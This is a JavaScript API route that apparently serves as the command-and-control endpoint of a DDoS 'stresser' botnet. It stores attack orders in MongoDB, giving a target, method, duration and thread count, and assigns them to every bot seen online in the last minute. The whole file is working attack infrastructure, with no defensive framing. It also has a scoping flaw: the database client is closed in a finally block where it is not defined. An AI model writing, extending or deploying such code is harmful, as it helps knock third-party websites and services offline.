import { MongoClient } from 'mongodb';

const uri = process.env.MONGODB_URI;

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { target, method, duration, threads } = req.body;
  if (!target) return res.status(400).json({ error: 'target required' });

  try {
    const client = new MongoClient(uri);
    await client.connect();
    const db = client.db('stresser');
    const commands = db.collection('commands');
    const bots = db.collection('bots');

    // Buscar bots online (últimos 60 segundos)
    const onlineBots = await bots.find({
      lastSeen: { $gt: new Date(Date.now() - 60000) }
    }).toArray();

    if (onlineBots.length === 0) {
      return res.status(503).json({ error: 'No online bots' });
    }

    // Criar um comando para cada bot
    const commandId = Date.now().toString(36) + Math.random().toString(36).substring(2);
    const command = {
      commandId,
      target,
      method: method || 'get',
      duration: parseInt(duration) || 30,
      threads: parseInt(threads) || 100,
      issuedAt: new Date(),
      assignedBots: onlineBots.map(b => b.botId)
    };

    await commands.insertOne(command);

    res.status(200).json({
      success: true,
      commandId,
      botsAssigned: onlineBots.length
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  } finally {
    await client.close();
  }
}